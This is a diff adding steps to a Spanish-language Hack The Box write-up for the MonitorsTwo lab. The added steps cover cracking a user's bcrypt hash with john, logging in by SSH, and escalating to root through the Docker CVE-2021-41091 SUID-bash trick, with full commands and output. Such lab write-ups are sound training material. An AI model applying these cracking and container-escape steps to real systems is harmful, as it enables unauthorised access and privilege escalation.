@@ -354,15 +354,220 @@ root@50bca5e748b0:/# mysql --host=db --user=root --password=root cacti -e "selec
 |  3 | guest    | 43e9a4ab75570f5b                                             |     0 | Guest Account  |                        | on                   | on              | on        | on        | on           | 3              |          1 |             1 |            1 |            1 |                      1 |         |         -1 |        -1 | -1               |        |               0 |        0 |           0 |
 |  4 | marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |     0 | Marcus Brune   | marcus@monitorstwo.htb |                      |                 | on        | on        | on           | on             |          1 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 |                  | on     |               0 |        0 |  2135691668 |
 +----+----------+--------------------------------------------------------------+-------+----------------+------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
-
 ```
+Guardamos el hash del usuario marcus en un archivo para intentar crackearlo con `john` de la siguiente manera.
+
+``` 
+Contenido del archivo `hash`
+marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
+```
+Ejecutamos el siguiente comando en el mismo directorio donde se aloja el archivo `hash`.
+```
+root@kali:~/Desktop/HTB/Machines/MonitorsTwo/content# john --wordlist=/usr/share/wordlists/rockyou.txt hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+funkymonkey      (marcus)     
+1g 0:00:00:23 DONE (2023-05-29 14:47) 0.04321g/s 370.2p/s 370.2c/s 370.2C/s 474747..nicole21
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+Ahora sabemos que las credenciales de marcus guardadas en la base de datos son `marcus:funkymonkey`. 
+Con esto vamos a intentar entrar a la máquina por `ssh` ya que estaba habilitado.
+```
+root@kali:~/Desktop/HTB/Machines/MonitorsTwo/exploits/CVE-2022-46169-CACTI-1.2.22# ssh marcus@monitors.htb
+marcus@monitors.htb's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue 30 May 2023 07:46:42 PM UTC
+
+  System load:                      0.0
+  Usage of /:                       64.2% of 6.73GB
+  Memory usage:                     32%
+  Swap usage:                       0%
+  Processes:                        294
+  Users logged in:                  1
+  IPv4 address for br-60ea49c21773: 172.18.0.1
+  IPv4 address for br-7c3b7c0d00b3: 172.19.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for eth0:            10.10.11.211
+  IPv6 address for eth0:            dead:beef::250:56ff:feb9:e2d3
+
+  => There are 2 zombie processes.
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+You have mail.
+Last login: Tue May 30 18:46:29 2023 from 10.10.14.73
+marcus@monitorstwo:~$ 
+```
+Con esto obtenemos acceso a `monitorstwo` como el usuario `marcus`.
 ## Escalada de Privilegios
 
-Descripción de los pasos realizados para escalar privilegios en la máquina, incluyendo la explotación de vulnerabilidades, la búsqueda de credenciales y cualquier otra técnica utilizada para obtener acceso de root o privilegios elevados.
+Si nos paramos a mirar lo que nos dice ssh al conectarnos, vemos que tenemos mail, por lo cual será de interés para nosotros y le echaremos un ojo. Antes de eso me cercioro de que no disponemos de ningún SUID o de ningún permiso para ejecutar ningún archivo con permisos más allá de los que ya disponemos, por lo cual me dispongo a mirar el mail directamente.
+```
+marcus@monitorstwo:~$ cd /var/mail/
+marcus@monitorstwo:/var/mail$ ls -la
+total 12
+drwxrwsr-x  2 root mail 4096 Mar 22 11:46 .
+drwxr-xr-x 13 root root 4096 Jan  9 10:03 ..
+-rw-r--r--  1 root mail 1809 Oct 18  2021 marcus
+marcus@monitorstwo:/var/mail$ cat marcus 
+From: administrator@monitorstwo.htb
+To: all@monitorstwo.htb
+Subject: Security Bulletin - Three Vulnerabilities to be Aware Of
 
-## Conclusiones y Recomendaciones
+Dear all,
 
-Resumen de las lecciones aprendidas durante el proceso de compromiso de la máquina y recomendaciones para mejorar la seguridad en áreas específicas. También se puede incluir información adicional relevante, como enlaces a recursos y referencias para ampliar el conocimiento.
+We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.
+
+CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.
+
+CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.
+
+CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.
+
+We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.
+
+Best regards,
+
+Administrator
+CISO
+Monitor Two
+Security Team
+marcus@monitorstwo:/var/mail$ 
+```
+En este mail nos nombra varias vulnerabilidades que se han detectado en lo que parece ser una auditoría y han quedado reflejadas en el propio mail de todos los miembros de la compañía, de las cuales nos vamos a centrar en la última, teniendo en cuenta que un exploit de kernel es menos probable que una vulnerabilidad de docker que expresamente puedes usar para escalar privilegios.
+Por lo cual buscando información acerca de la vulnerabilidad dí con [este post](https://exploit-notes.hdks.org/exploit/container/docker/moby-docker-engine-privesc/), el cual nos va a venir genial de guía para hacer nuestra escalada.
+
+Empezamos por buscar en nuestra máquina donde se encuentran montados los contenedores de docker que tenemos activos, tenemos dos por lo cual nos tocará probar en ambos si no conseguimos escalar a la primera.
+Este documento nos dice que a través de dicha vulnerabilidad podemos ejecutar un comando en la máquina host de los contenedores que pertenezca a un contenedor.
+En nuestro caso vamos a seguirlo al pie de la letra para conseguir con `/bin/bash` siendo SUID ejecutarlo en el host accediendo al host valga la redundancia siendo `root`.
+Para ello procedemos de la siguiente manera...
+```
+marcus@monitorstwo:/var/mail$ findmnt
+TARGET                                SOURCE      FSTYPE   OPTIONS
+/                                     /dev/sda2   ext4     rw,relatime
+├─/sys                                sysfs       sysfs    rw,nosuid,nodev,noexec,relatime
+│ ├─/sys/kernel/security              securityfs  security rw,nosuid,nodev,noexec,relatime
+│ ├─/sys/fs/cgroup                    tmpfs       tmpfs    ro,nosuid,nodev,noexec,mode=755
+│ │ ├─/sys/fs/cgroup/unified          cgroup2     cgroup2  rw,nosuid,nodev,noexec,relatime,nsd
+│ │ ├─/sys/fs/cgroup/systemd          cgroup      cgroup   rw,nosuid,nodev,noexec,relatime,xat
+│ │ ├─/sys/fs/cgroup/cpu,cpuacct      cgroup      cgroup   rw,nosuid,nodev,noexec,relatime,cpu
+│ │ ├─/sys/fs/cgroup/devices          cgroup      cgroup   rw,nosuid,nodev,noexec,relatime,dev
+│ │ ├─/sys/fs/cgroup/memory           cgroup      cgroup   rw,nosuid,nodev,noexec,relatime,mem
+│ │ ├─/sys/fs/cgroup/net_cls,net_prio cgroup      cgroup   rw,nosuid,nodev,noexec,relatime,net
+│ │ ├─/sys/fs/cgroup/rdma             cgroup      cgroup   rw,nosuid,nodev,noexec,relatime,rdm
+│ │ ├─/sys/fs/cgroup/freezer          cgroup      cgroup   rw,nosuid,nodev,noexec,relatime,fre
+│ │ ├─/sys/fs/cgroup/blkio            cgroup      cgroup   rw,nosuid,nodev,noexec,relatime,blk
+│ │ ├─/sys/fs/cgroup/perf_event       cgroup      cgroup   rw,nosuid,nodev,noexec,relatime,per
+│ │ ├─/sys/fs/cgroup/cpuset           cgroup      cgroup   rw,nosuid,nodev,noexec,relatime,cpu
+│ │ ├─/sys/fs/cgroup/pids             cgroup      cgroup   rw,nosuid,nodev,noexec,relatime,pid
+│ │ └─/sys/fs/cgroup/hugetlb          cgroup      cgroup   rw,nosuid,nodev,noexec,relatime,hug
+│ ├─/sys/fs/pstore                    pstore      pstore   rw,nosuid,nodev,noexec,relatime
+│ ├─/sys/fs/bpf                       none        bpf      rw,nosuid,nodev,noexec,relatime,mod
+│ ├─/sys/kernel/debug                 debugfs     debugfs  rw,nosuid,nodev,noexec,relatime
+│ ├─/sys/kernel/tracing               tracefs     tracefs  rw,nosuid,nodev,noexec,relatime
+│ ├─/sys/fs/fuse/connections          fusectl     fusectl  rw,nosuid,nodev,noexec,relatime
+│ └─/sys/kernel/config                configfs    configfs rw,nosuid,nodev,noexec,relatime
+├─/proc                               proc        proc     rw,nosuid,nodev,noexec,relatime
+│ └─/proc/sys/fs/binfmt_misc          systemd-1   autofs   rw,relatime,fd=28,pgrp=1,timeout=0,
+│   └─/proc/sys/fs/binfmt_misc        binfmt_misc binfmt_m rw,nosuid,nodev,noexec,relatime
+├─/dev                                udev        devtmpfs rw,nosuid,noexec,relatime,size=1966
+│ ├─/dev/pts                          devpts      devpts   rw,nosuid,noexec,relatime,gid=5,mod
+│ ├─/dev/shm                          tmpfs       tmpfs    rw,nosuid,nodev
+│ ├─/dev/hugepages                    hugetlbfs   hugetlbf rw,relatime,pagesize=2M
+│ └─/dev/mqueue                       mqueue      mqueue   rw,nosuid,nodev,noexec,relatime
+├─/run                                tmpfs       tmpfs    rw,nosuid,nodev,noexec,relatime,siz
+│ ├─/run/lock                         tmpfs       tmpfs    rw,nosuid,nodev,noexec,relatime,siz
+│ ├─/run/docker/netns/4e296a7b04fc    nsfs[net:[4026532597]]
+│ │                                               nsfs     rw
+│ ├─/run/user/1000                    tmpfs       tmpfs    rw,nosuid,nodev,relatime,size=40260
+│ └─/run/docker/netns/2726eab615b7    nsfs[net:[4026532659]]
+│                                                 nsfs     rw
+├─/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
+│                                     overlay     overlay  rw,relatime,lowerdir=/var/lib/docke
+├─/var/lib/docker/containers/e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69/mounts/shm
+│                                     shm         tmpfs    rw,nosuid,nodev,noexec,relatime,siz
+├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
+│                                     overlay     overlay  rw,relatime,lowerdir=/var/lib/docke
+└─/var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/mounts/shm
+                                      shm         tmpfs    rw,nosuid,nodev,noexec,relatime,siz
+marcus@monitorstwo:/var/mail$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
+marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ls -l
+total 156
+drwxr-xr-x 1 root root  4096 Mar 22 13:21 bin
+drwxr-xr-x 2 root root  4096 Mar 22 13:21 boot
+drwxr-xr-x 1 root root  4096 Mar 21 10:49 dev
+-rwxr-xr-x 1 root root     0 Jan  5 11:37 entrypoint.sh
+drwxr-xr-x 1 root root  4096 Mar 21 10:49 etc
+drwxr-xr-x 2 root root  4096 Mar 22 13:21 home
+drwxr-xr-x 1 root root  4096 Nov 15  2022 lib
+drwxr-xr-x 2 root root  4096 Mar 22 13:21 lib64
+drwxr-xr-x 2 root root  4096 Mar 22 13:21 media
+drwxr-xr-x 1 root root  4096 May 30 10:25 mnt
+drwxr-xr-x 2 root root  4096 Mar 22 13:21 opt
+drwxr-xr-x 2 root root  4096 Mar 22 13:21 proc
+drwx------ 1 root root  4096 Mar 21 10:50 root
+drwxr-xr-x 1 root root  4096 May 30 10:25 run
+drwxr-xr-x 1 root root  4096 Jan  9 09:30 sbin
+drwxr-xr-x 2 root root  4096 Mar 22 13:21 srv
+drwxr-xr-x 2 root root  4096 Mar 22 13:21 sys
+drwxrwxrwt 1 root root 69632 May 30 20:04 tmp
+drwxr-xr-x 1 root root  4096 Nov 14  2022 usr
+drwxr-xr-x 1 root root  4096 Nov 15  2022 var
+
+
+```
+Nuestra ruta de interes habiendo hecho un `ls -l` en el primer contenedor vemos que es la siguiente:
+- /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
+Ahora vamos a proceder a crear un binario SUID de `/bin/bash` dentro del contenedor ya que somos root....
+```
+root@50bca5e748b0:/# chmod u+s /bin/bash 
+root@50bca5e748b0:/# ls -l /bin/bash 
+-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
+```
+
+Y desde nuestra máquina atacante nos vamos a dirigir al directorio anterior y vamos a ejecutar lo siguiente:
+```
+marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ./bin/bash -p
+bash-5.1# whoami
+root
+bash-5.1# cd /root/
+bash-5.1# ls -la
+total 36
+drwx------  6 root root 4096 Mar 22 13:21 .
+drwxr-xr-x 19 root root 4096 Mar 22 13:21 ..
+lrwxrwxrwx  1 root root    9 Jan 20  2021 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
+drwx------  2 root root 4096 Mar 22 13:21 .cache
+drwxr-xr-x  2 root root 4096 Mar 22 13:21 cacti
+drwxr-xr-x  3 root root 4096 Mar 22 13:21 .local
+-rw-r--r--  1 root root  161 Dec  5  2019 .profile
+-rw-r-----  1 root root   33 May 30 10:24 root.txt
+drwx------  2 root root 4096 Mar 22 13:21 .ssh
+bash-5.1# cat root.txt 
+7c9d99fdff4b91dce3ad8509b4c034ef
+```
+De esta manera somos root en monitortwo y obtenemos las dos flags necesarias para finalizar la máquina.
 
 ## Agradecimientos
 
